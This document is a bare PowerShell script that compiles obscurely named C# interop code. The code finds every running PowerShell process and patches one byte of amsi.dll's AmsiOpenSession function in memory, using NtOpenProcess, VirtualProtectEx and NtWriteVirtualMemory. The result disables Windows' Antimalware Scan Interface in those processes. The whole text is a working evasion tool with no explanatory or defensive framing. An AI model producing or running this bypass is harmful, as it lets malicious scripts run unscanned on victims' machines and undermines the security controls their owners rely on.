$code = @"
using System;
using System.Runtime.InteropServices;

public class A {
 public const int X = 0x8, Y = 0x10, Z = 0x20;
 public const uint P = 0x40;

 [DllImport("ntdll.dll")] public static extern int NtOpenProcess(out IntPtr h, uint d, ref G a, ref I b);
 [DllImport("ntdll.dll")] public static extern int NtWriteVirtualMemory(IntPtr h, IntPtr a, byte[] b, uint l, out uint r);
 [DllImport("ntdll.dll")] public static extern int NtClose(IntPtr h);
 [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr LoadLibrary(string f);
 [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetProcAddress(IntPtr h, string n);
 [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, UIntPtr s, uint p, out uint o);
}

[StructLayout(LayoutKind.Sequential)] public struct G {
 public int L; public IntPtr R1, R2, R3; public IntPtr S1, S2;
}

[StructLayout(LayoutKind.Sequential)] public struct I {
 public IntPtr P1, P2;
}
"@

Add-Type -TypeDefinition $code -Language CSharp

function Patch-AMSI {
 param([int]$pid)

 $a = [byte]0xEB
 $oa = New-Object G
 $cid = New-Object I
 $cid.P1 = [IntPtr]$pid
 $cid.P2 = [IntPtr]::Zero
 $oa.L = [Runtime.InteropServices.Marshal]::SizeOf($oa)
 $h = [IntPtr]::Zero

 $res = [A]::NtOpenProcess([ref]$h, [A]::X -bor [A]::Y -bor [A]::Z, [ref]$oa, [ref]$cid)
 if ($res -ne 0) { return }

 $dll = [A]::LoadLibrary("amsi.dll")
 if ($dll -eq [IntPtr]::Zero) { [A]::NtClose($h); return }

 $fn = [A]::GetProcAddress($dll, "AmsiOpenSession")
 if ($fn -eq [IntPtr]::Zero) { [A]::NtClose($h); return }

 $target = [IntPtr]($fn.ToInt64() + 3)
 $old = [UInt32]0
 $sz = [UIntPtr]::op_Explicit(1)

 $ok = [A]::VirtualProtectEx($h, $target, $sz, [A]::P, [ref]$old)
 if (-not $ok) { [A]::NtClose($h); return }

 $written = [UInt32]0
 [A]::NtWriteVirtualMemory($h, $target, [byte[]]@($a), 1, [ref]$written)
 [A]::VirtualProtectEx($h, $target, $sz, $old, [ref]$old)
 [A]::NtClose($h)
}

Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object { Patch-AMSI -pid $_.Id }
